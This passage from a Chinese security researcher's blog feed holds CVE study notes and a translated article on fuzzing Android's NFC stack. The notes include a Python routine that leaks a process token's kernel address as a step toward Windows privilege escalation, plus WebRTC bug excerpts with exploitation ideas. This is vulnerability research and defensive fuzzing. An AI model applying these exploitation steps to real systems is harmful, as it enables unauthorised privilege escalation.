href="https://segfault.me/2019/05/24/exploiting-an-arbitrary-write-to-escalate-privileges/" target="_blank" rel="noopener">blog</a> for details.</li><li>写进程token为0xffffffffffffffff即可提权，就用户级API可以泄露，代码如下：</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">STATUS_INFO_LENGTH_MISMATCH = <span class="number">0xC0000004</span></span><br><span class="line">SystemExtendedHandleInformation = <span class="number">64</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token_address</span><span class="params">()</span>:</span></span><br><span class="line">    hProc = HANDLE(kernel32.GetCurrentProcess())</span><br><span class="line">    pid = kernel32.GetCurrentProcessId()</span><br><span class="line">    h = HANDLE()</span><br><span class="line">    res = OpenProcessToken(hProc, TOKEN_QUERY, byref(h))</span><br><span class="line">    <span class="keyword">if</span> res == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'[-] Error getting token handle: '</span>)</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Find the handles associated with the current process.</span></span><br><span class="line">    q = STATUS_INFO_LENGTH_MISMATCH</span><br><span class="line">    out = DWORD(<span class="number">0</span>)</span><br><span class="line">    sz = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> q == STATUS_INFO_LENGTH_MISMATCH:</span><br><span class="line">        sz += <span class="number">0x1000</span></span><br><span class="line">        handle_info = (c_ubyte * sz)()</span><br><span class="line">        q = ntdll.NtQuerySystemInformation(</span><br><span class="line">                SystemExtendedHandleInformation,</span><br><span class="line">                byref(handle_info),</span><br><span class="line">                sz,</span><br><span class="line">                byref(out)</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Parse handle_info to retrieve handles for the current PID</span></span><br><span class="line">    handles = find_handles(pid, handle_info)</span><br><span class="line">    hToken = filter(<span class="keyword">lambda</span> x: x[<span class="number">0</span>] == pid <span class="keyword">and</span> x[<span class="number">2</span>] == h.value, handles)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(hToken) != <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> hToken[<span class="number">0</span>][<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>Windows进程token结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt -r nt!_TOKEN</span><br><span class="line">nt!_TOKEN</span><br><span class="line">   +0x000 TokenSource      : _TOKEN_SOURCE</span><br><span class="line">      +0x000 SourceName       : [8] Char</span><br><span class="line">      +0x008 SourceIdentifier : _LUID</span><br><span class="line">         +0x000 LowPart          : Uint4B</span><br><span class="line">         +0x004 HighPart         : Int4B</span><br><span class="line">      ... snip ...</span><br><span class="line">      +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES</span><br><span class="line">         +0x000 Present          : Uint8B // Privileges to consider</span><br><span class="line">         +0x008 Enabled          : Uint8B // Privileges that are granted</span><br><span class="line">         +0x010 EnabledByDefault : Uint8B // Privileges granted to child processes</span><br><span class="line">      ... snip ...</span><br></pre></td></tr></table></figure><h2 id="Exploiting-Android-Messengers-with-WebRTC-Part-1"><a href="#Exploiting-Android-Messengers-with-WebRTC-Part-1" class="headerlink" title="Exploiting Android Messengers with WebRTC: Part 1"></a>Exploiting Android Messengers with WebRTC: Part 1</h2><p><a href="https://googleprojectzero.blogspot.com/2020/08/exploiting-android-messengers-part-1.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2020/08/exploiting-android-messengers-part-1.html</a></p><blockquote><p>WebRTC is an open source video conferencing solution used by a variety of software including browsers, messaging clients and streaming services.</p></blockquote><p>这系列文章分析了WebRTC漏洞，CVE-2020-6389和CVE-2020-6387，在Messenger中的利用。</p><h3 id="CVE-2020-6389漏洞点分析"><a href="#CVE-2020-6389漏洞点分析" class="headerlink" title="CVE-2020-6389漏洞点分析"></a>CVE-2020-6389漏洞点分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (layer_info_it-&gt;second[temporal_idx] != <span class="number">-1</span> &amp;&amp;</span><br><span class="line">AheadOf&lt;<span class="keyword">uint16_t</span>&gt;(layer_info_it-&gt;second[temporal_idx], frame-&gt;id.picture_id)) &#123;</span><br><span class="line">      <span class="comment">// Not a newer frame. No subsequent layer info needs update.</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  ...</span><br><span class="line">   layer_info_it-&gt;second[temporal_idx] = frame-&gt;id.picture_id;</span><br></pre></td></tr></table></figure><p><code>layer_info_it-&gt;second[]</code>只有5个元素，而索引<code>temporal_idx</code>能取到7；但是<code>layer_info_it-&gt;second[]</code>是64位，<code>frame-&gt;id.picture_id</code>是16位，太小了，表示不了指针；</p><h3 id="CVE-2020-6387漏洞点分析"><a href="#CVE-2020-6387漏洞点分析" class="headerlink" title="CVE-2020-6387漏洞点分析"></a>CVE-2020-6387漏洞点分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> RTPExtensionType::kRtpExtensionVideoTiming: &#123;</span><br><span class="line">    <span class="comment">// Nullify 3 last entries: packetization delay and 2 network timestamps.</span></span><br><span class="line">    <span class="comment">// Each of them is 2 bytes.</span></span><br><span class="line">    <span class="keyword">uint8_t</span>* p = WriteAt(extension.offset) + VideoSendTiming::kPacerExitDeltaOffset;    <span class="comment">// x + 7</span></span><br><span class="line">    <span class="built_in">memset</span>(</span><br><span class="line">        p,</span><br><span class="line">        <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有检查<code>WriteAt(extension.offset)</code>能写的空间是否大于13，所以有off by null。</p><h3 id="CVE-2020-6389能利用吗"><a href="#CVE-2020-6389能利用吗" class="headerlink" title="CVE-2020-6389能利用吗"></a>CVE-2020-6389能利用吗</h3><p>还真能，覆盖到下图<code>StunMessage</code>类的vector的<strong>end</strong>了，end是16位的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="comment">//   pointer __begin_;</span></span><br><span class="line"><span class="comment">//   pointer __end_;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;StunAttribute&gt;&gt; attrs_;</span><br><span class="line"> ...</span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">uint16_t</span> type_;</span><br><span class="line">  <span class="keyword">uint16_t</span> length_;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> transaction_id_;</span><br><span class="line">  <span class="keyword">uint32_t</span> reduced_transaction_id_;</span><br><span class="line">  <span class="keyword">uint32_t</span> stun_magic_cookie_;</span><br></pre></td></tr></table></figure><p>但是，在典型配置中，WebRTC连接一端的攻击者不可能将STUN发送给另一端的用户，然后：“I asked Philipp Hancke of <a href="https://webrtchacks.com/" target="_blank" rel="noopener">webrtchacks</a> if he knew of a way. He suggested this <a href="https://github.com/fippo/tcp-mitm">method</a>, which involves specifying a TCP server controlled by the attacker as a potential routable path between two peers, called an ICE candidate. Both the attacker and target device will then communicate through this server, including STUN messages.”。</p><h3 id="绕过ASLR"><a href="#绕过ASLR" class="headerlink" title="绕过ASLR"></a>绕过ASLR</h3><p>Mark Brand suggested that it might be possible to use CVE-2020-6387 to accomplish this by setting the low bytes of a pointer to outgoing data to zero, causing out-of-bounds data to be sent instead of the actual data. This seemed like a promising approach, so I used IDA to look for potential objects.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RefCountedObject vtable;</span><br><span class="line"><span class="keyword">size_t</span> size_;</span><br><span class="line"><span class="keyword">size_t</span> Capacity_;</span><br><span class="line"><span class="built_in">std</span> :: <span class="built_in">unique_ptr</span> &lt;T []&gt; data_;</span><br></pre></td></tr></table></figure><p>I also thought about using CVE-2020-6387 to alter a vtable or a function pointer in order to read memory, cause behavior detectable by a crash oracle or perform offset-based exploitation that doesn’t require ASLR to be broken. I decided not to pursue this path, because the end result would depend on which functions and vtables are loaded at locations ending in zero, which varies greatly between builds.</p><p>最后决定找新的漏洞来绕过ASLR（下一Part）。</p><h2 id="CVE-2020–9854-“Unauthd”"><a href="#CVE-2020–9854-“Unauthd”" class="headerlink" title="CVE-2020–9854: “Unauthd”"></a>CVE-2020–9854: “Unauthd”</h2><p><a href="https://objective-see.com/blog/blog_0x4D.html" target="_blank" rel="noopener">https://objective-see.com/blog/blog_0x4D.html</a></p><p>MacOS权限提升的漏洞利用链。</p><h2 id="CVE-2020–9854-“Unauthd”-1"><a href="#CVE-2020–9854-“Unauthd”-1" class="headerlink" title="CVE-2020–9854: “Unauthd”"></a>CVE-2020–9854: “Unauthd”</h2><p><a href="https://objective-see.com/blog/blog_0x4D.html" target="_blank" rel="noopener">https://objective-see.com/blog/blog_0x4D.html</a></p><p>挺有意思一MacOS逻辑漏洞。</p><h2 id="VirtualBox漏洞挖掘"><a href="#VirtualBox漏洞挖掘" class="headerlink" title="VirtualBox漏洞挖掘"></a>VirtualBox漏洞挖掘</h2><p>// TODO</p><p>先看一波这个：</p><p><a href="https://www.voidsecurity.in/?m=1" target="_blank" rel="noopener">https://www.voidsecurity.in/?m=1</a></p><h3 id="如何挖洞"><a href="#如何挖洞" class="headerlink" title="如何挖洞"></a>如何挖洞</h3><p><a href="https://www.anquanke.com/post/id/212096" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212096</a></p><p><a href="https://www.anquanke.com/post/id/211930" target="_blank" rel="noopener">https://www.anquanke.com/post/id/211930</a>（很多paper）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;7.28 – 今，ssj学习笔记。&lt;/p&gt;
&lt;h2 id=&quot;CVE-2020-1362漏洞分析&quot;&gt;&lt;a href=&quot;#CVE-2020-1362漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-1362漏洞分析&quot;&gt;&lt;/a&gt;CVE-2020-1
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>【翻译】Structured fuzzing Android&#39;s NFC</title>
    <link href="https://github.com/Cracke-S-J/2020/07/18/Structured-fuzzing-Android-s-NFC/"/>
    <id>https://github.com/Cracke-S-J/2020/07/18/Structured-fuzzing-Android-s-NFC/</id>
    <published>2020-07-17T16:05:27.000Z</published>
    <updated>2020-07-18T14:36:37.343Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://securitylab.github.com/research/fuzzing_android_nfc" target="_blank" rel="noopener">https://securitylab.github.com/research/fuzzing_android_nfc</a></p><p>就心热来潮想翻译一下。机翻+手动调整。能理解意思的奇怪语句没有调。</p><hr><p>在本文中，我将详细介绍如何使用<code>libprotobuf-mutator</code>为Android的NFC组件构建fuzzer。NFC Fuzzer本身是公开的，包含使用文档和说明，因此，本文着重于构建Fuzzer时的一些设计方面的注意事项。</p><h2 id="Android-NFC"><a href="#Android-NFC" class="headerlink" title="Android NFC"></a>Android NFC</h2><p>Android NFC允许Android手机与NFC感应器（智能卡，smarter sticker等）或其他Android设备共享数据。该组件支持三种不同类型的操作：</p><ol><li>Reader/Writer模式：这允许移动设备充当NFC标签/读卡器或写入器，并用于与NFC标签进行交互；</li><li>对等（P2P）模式：这允许设备通过NFC与另一设备交互；</li><li>卡仿真模式：这允许NFC设备像NFC标签一样工作并与外部读卡器或写卡器进行交互；</li></ol><p>这篇文章和fuzzer将仅查看Reader/Writer模式。Android NFC实现了NFC forum定义的各种类型的NFC tag，这是用于NFC通信的不同协议。与NFC tag进行交互时，Android设备可以充当Reader或Writer。虽然一个Writer可以执行更多类型的操作（并因此具有更大的攻面），但它通常需要第三方应用程序，例如这一个要安装特定程序以及用户交互以初始化写入。另一方面，只要NFC处于打开状态（默认设置）且屏幕处于活动状态，只要设备进入NFC标签范围，就会自动完成读取和检测NFC标签的操作。因此，读取器模式下的漏洞比写入器模式下的漏洞高得多的风险。</p><p>Android中的NFC组件是曾经是<a href="https://android-developers.googleblog.com/2019/05/queue-hardening-enhancements.html" target="_blank" rel="noopener">很多漏洞</a>的来源。在2018年，它是Android中严重程度最高的漏洞的第四大来源。这种趋势一直持续到2019年，Qi Zhao @JHyrathon and Guang Gong @oldfresher of Qihoo 360 Alpha Lab, and Xuan Xing of Google贡献了许多漏洞。</p><p>Qi Zhao在<a href="https://hitcon.org/2019/CMT/slide-files/d1_s2_r1.pdf" target="_blank" rel="noopener">此处</a>写了一篇有关NFC漏洞的详尽报告，解释了Android NFC的基本概念以及攻击面，并提供了一些很好的示例，因此在这里我不会重复他的工作，而将重点放在fuzz的方面。他还拥有一个repo，该repo展示了他发现的一些漏洞的PoC，这在本研究的早期非常有用。</p><h2 id="Structured-fuzzing-Android-NFC"><a href="#Structured-fuzzing-Android-NFC" class="headerlink" title="Structured fuzzing Android NFC"></a>Structured fuzzing Android NFC</h2><p>实际上，创建Android NFC fuzzer的思路与<a href="https://securitylab.github.com/research/fuzzing-sockets-FTP" target="_blank" rel="noopener">fuzz socket</a>非常相似，在Android上运行它有些复杂。由于Android对libFuzzer具有很好的支持，因此我们将使用libFuzzer和libprotobuf-mutator来实现structured fuzzing。</p><h3 id="Fuzzing环境设置"><a href="#Fuzzing环境设置" class="headerlink" title="Fuzzing环境设置"></a>Fuzzing环境设置</h3><p>Android NFC Reader/Writer组件使用消息循环来处理事件，该事件可能包含设备本身的内部事件或来自NFC tag的外部事件。此消息循环在以下nfc_task函数中实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> nfc_task(__attribute__((unused)) <span class="keyword">uint32_t</span> arg) &#123;</span><br><span class="line">  <span class="keyword">uint16_t</span> event;</span><br><span class="line">  NFC_HDR* p_msg;</span><br><span class="line">  <span class="keyword">bool</span> free_buf;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize the nfc control block */</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;nfc_cb, <span class="number">0</span>, <span class="keyword">sizeof</span>(tNFC_CB));</span><br><span class="line"></span><br><span class="line">  DLOG_IF(INFO, nfc_debug_enabled) &lt;&lt; StringPrintf(<span class="string">"NFC_TASK started."</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* main loop */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    event = GKI_wait(<span class="number">0xFFFF</span>, <span class="number">0</span>); <span class="comment">//&lt;-- take an event from a task queue</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (event &amp; NFC_MBOX_EVT_MASK) &#123;</span><br><span class="line">      <span class="comment">/* Process all incoming NCI messages */</span></span><br><span class="line">      <span class="keyword">while</span> ((p_msg = (NFC_HDR*)GKI_read_mbox(NFC_MBOX_ID)) != <span class="literal">nullptr</span>) &#123; <span class="comment">//&lt;-- take a message from a queue</span></span><br><span class="line">        free_buf = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Determine the input message type. */</span></span><br><span class="line">        <span class="keyword">switch</span> (p_msg-&gt;event &amp; NFC_EVT_MASK) &#123;</span><br><span class="line">          <span class="keyword">case</span> BT_EVT_TO_NFC_NCI:</span><br><span class="line">            free_buf = nfc_ncif_process_event(p_msg);  <span class="comment">//&lt;--- processing the message</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> BT_EVT_TO_START_TIMER:</span><br><span class="line">             ...</span><br></pre></td></tr></table></figure><p>在上面，GKI_read_mbox负责将数据读取到消息（p_msg）中，然后在nfc_ncif_process_event函数中进行处理。带有NFC tag的通信在这里处理。</p><p>为了使我们免于设置各种任务队列并专注于可以由NFC标签控制的事件，我决定以该nfc_ncif_process_event函数为切入点，并实现一个更简单的消息循环，该循环将继续使用fuzzer的输入来调用此函数。 但是，获取入口点只是第一步。为了产生有用的结果，fuzzer需要是实际应用的合理近似值。这至少需要满足以下条件：1.我们可以从标签控制输入数据的哪一部分，例如，nfc_ncif_process_event在现实情况下会接收任意长度的消息吗？是否有硬件根据传入的数据填充了元数据？2.在读取/写入标签之前需要设置哪些状态变量，并且在每次读取/写入之后它们会重置吗？</p><p>经过大量测试后，我确定了上面p_msg处理的各种约束nfc_ncif_process_event，包括消息长度的约束以及一些元数据。然后，将这些知识用于实现各种harness_common.cc用于创建p_msgfuzz测试的方法以及用于设置fuzz测试环境的其他方法。在这一点上，fuzz可以从这开始：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">setup(PROTOCOL);</span><br><span class="line">nfa_rw_start_ndef_detection(); </span><br><span class="line">nfa_rw_cb.cur_op = NFA_RW_OP_READ_NDEF;</span><br><span class="line"><span class="keyword">uint8_t</span>[<span class="number">258</span>] buffer;</span><br><span class="line"><span class="keyword">size_t</span> data_len;</span><br><span class="line"><span class="keyword">while</span> (data_len = readSomeData(buffer)) &#123;</span><br><span class="line">  NFC_HDR* p_msg = create_data_msg_meta(data_len, buffer);</span><br><span class="line">  nfc_ncif_process_event(p_msg);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这不是一个非常有效的fuzzer，因为NFC协议期望消息数据具有某种结构，否则某些早期检查将失败。</p><h3 id="考虑到协议的特定细节"><a href="#考虑到协议的特定细节" class="headerlink" title="考虑到协议的特定细节"></a>考虑到协议的特定细节</h3><p>现在，我将限于NFC forum type 2 tag，该标记主要在rw_t2t.cc和中实现rw_t2t_ndef.cc。</p><p>nfc_ncif_process_event首先处理的消息到达rw_t2t_proc_data，在此处执行各种检查。在检测阶段，即设备首次与NFC标签接触时，如果所有对消息长度和元数据的检查都通过了，它将继续rw_t2t_handle_rsp进行，对实际数据进行更有趣的处理。</p><p>这些检查rw_t2t_proc_data对消息有相当严格的限制。基本上，这意味着每个消息都必须具有1（一个”ack”）或16（实际数据）的固定长度，除非子状态为RW_T2T_SUBSTATE_WAIT_SELECT_SECTOR_SUPPORT：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p_t2t-&gt;substate == RW_T2T_SUBSTATE_WAIT_SELECT_SECTOR_SUPPORT) &#123;</span><br><span class="line">  <span class="comment">/* The select process happens in two steps */</span></span><br><span class="line">  <span class="keyword">if</span> ((*p &amp; <span class="number">0x0f</span>) == T2T_RSP_ACK) &#123;</span><br><span class="line">    <span class="keyword">if</span> (rw_t2t_sector_change(p_t2t-&gt;select_sector) == NFC_STATUS_OK)</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>为了满足这些约束，我在libFuzzer之上使用了libprotobuf-mutator为输入提供结构。这是一个非常有用的库，用于使用libFuzzer实现结构化的fuzz测试，并且已经取得了许多成功。它允许使用protobuf语法指定一种输入结构。就我而言，我希望每条消息的长度为16或1，因此我将2(int64)用作长度16的消息，并将第三个字段ack用作切换使用长度16或长度1的概率：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Generic response of fixed length</span></span><br><span class="line">message DefaultResponse &#123;</span><br><span class="line">  required int64 hdr_0 = <span class="number">1</span>;</span><br><span class="line">  required int64 hdr_1 = <span class="number">2</span>;</span><br><span class="line">  required uint32 ack = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ack解析时，该字段将转换为概率，以决定使用完整的16个字节还是仅使用1个字节。（基本检查了ack阈值）。</p><h3 id="考虑状态"><a href="#考虑状态" class="headerlink" title="考虑状态"></a>考虑状态</h3><p>如前所述，允许的消息长度还取决于Android NFC的子状态。这是相当不便的，因为随机生成的消息可能刚结束而不是所期望的消息并立即被拒绝。这也可能导致fuzzer“放弃”不太可能的状态（即，如果某些状态比其他状态更频繁地出现，则fuzzer可能会停止生成适用于较小状态的样本，而这些样本最终将根本无法进行测试）。为了解决这个问题，语料库中的每个样本都包含多个队列，每个状态一个，而不是从fuzzer生成单个线性队列，而fuzzer将根据当前状态决定从哪个队列中获取样本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">message DetectSession &#123;</span><br><span class="line">  repeated WaitSelectSector wait_select = <span class="number">1</span>;</span><br><span class="line">  repeated DefaultResponse dr = <span class="number">2</span>;</span><br><span class="line">  repeated WaitCc wait_cc = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，一个fuzz测试会话包含三个队列（repeated相当于protobuf中的array）。每个消息对应一个针对不同状态的专用消息，并且fuzzer根据实际状态决定使用哪个消息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">void handleT2T(const nfc::DetectSession&amp; session) &#123;</span><br><span class="line">  bool free_buf;</span><br><span class="line">  tRW_T2T_CB* p_t2t = &amp;rw_cb.tcb.t2t;</span><br><span class="line">  int wait_cc_counter = 0;</span><br><span class="line">  int default_message_counter = 0;</span><br><span class="line">  int wait_select_counter = 0;</span><br><span class="line">  for (int i = 0; i &lt; max_op; i++) &#123;</span><br><span class="line">    NFC_HDR* p_msgs[1] = &#123;0&#125;;</span><br><span class="line">    //Choose the appropriate message depending on the state</span><br><span class="line">    switch (p_t2t-&gt;substate) &#123;</span><br><span class="line">        case RW_T2T_SUBSTATE_WAIT_READ_CC:</span><br><span class="line">          if (wait_cc_counter &gt;= session.wait_cc_size()) return;</span><br><span class="line">          create_t2t_wait_cc(session.wait_cc(wait_cc_counter++), p_msgs);</span><br><span class="line">          break;</span><br><span class="line">        case RW_T2T_SUBSTATE_WAIT_SELECT_SECTOR:</span><br><span class="line">          if (wait_select_counter &gt;= session.wait_select_size()) return;</span><br><span class="line">          create_t2t_wait_select_sector(session.wait_select(wait_select_counter++), p_msgs);</span><br><span class="line">          break;</span><br><span class="line">        default:</span><br><span class="line">          if (default_message_counter &gt;= session.dr_size()) return;</span><br><span class="line">          create_t2t_default_response(session.dr(default_message_counter++), p_msgs);</span><br><span class="line">          break;</span><br><span class="line">    &#125;</span><br><span class="line">    if (*p_msgs) &#123;</span><br><span class="line">      set_message_len(*p_msgs);</span><br><span class="line">      NFC_HDR* msg = copy_msg(*p_msgs);</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尽管在当前情况下这种调整似乎没有收获，但我认为当州与州之间存在更多分歧时，这种调整将很有用。</p><h3 id="在枚举和数据之间切换"><a href="#在枚举和数据之间切换" class="headerlink" title="在枚举和数据之间切换"></a>在枚举和数据之间切换</h3><p>在负责解析NFC数据的代码中，我注意到数据本身有时被解释为枚举：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (p_t2t-&gt;substate) &#123;</span><br><span class="line">  <span class="keyword">case</span> RW_T2T_SUBSTATE_WAIT_TLV_DETECT:</span><br><span class="line">    <span class="comment">/* Search for the tlv */</span></span><br><span class="line">    p_t2t-&gt;found_tlv = p_data[offset++]; <span class="comment">//&lt;--- p_data is the user controlled data</span></span><br><span class="line">    <span class="keyword">switch</span> (p_t2t-&gt;found_tlv) &#123;  <span class="comment">//&lt;--- interpreted as enum</span></span><br><span class="line">      <span class="keyword">case</span> TAG_NULL_TLV: <span class="comment">/* May be used for padding. SHALL ignore this */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> TAG_NDEF_TLV:</span><br></pre></td></tr></table></figure><p>在其他时候，它可能被解释为数字：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> RW_T2T_SUBSTATE_WAIT_FIND_LEN_FIELD_LEN:</span><br><span class="line">  len = p_data[offset];  <span class="comment">//&lt;--- p_data is user controlled, </span></span><br><span class="line">   ...</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* one byte length field */</span></span><br><span class="line">        p_t2t-&gt;ndef_msg_len = len;   <span class="comment">//&lt;--- len interpreted as an actual number</span></span><br><span class="line">        p_t2t-&gt;bytes_count = p_t2t-&gt;ndef_msg_len;</span><br><span class="line">        p_t2t-&gt;substate = RW_T2T_SUBSTATE_WAIT_READ_TLV_VALUE;</span><br></pre></td></tr></table></figure><p>这种解释上的差异并不取决于offset。有时将具有相同偏移量的数据解释为枚举，而有时将其解释为数字，具体取决于之前的数据。这是一个问题，因为枚举只有六个有意义的值，而一个数字可能会占用整个范围。为了克服这个问题，我引入了一个将数据解释为枚举时将数字转换为枚举的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//converts uint8_t to one of the tlv states (see tags_defs.h)</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> uint8_t <span class="title">num2tlv</span><span class="params">(<span class="keyword">uint8_t</span> input)</span> 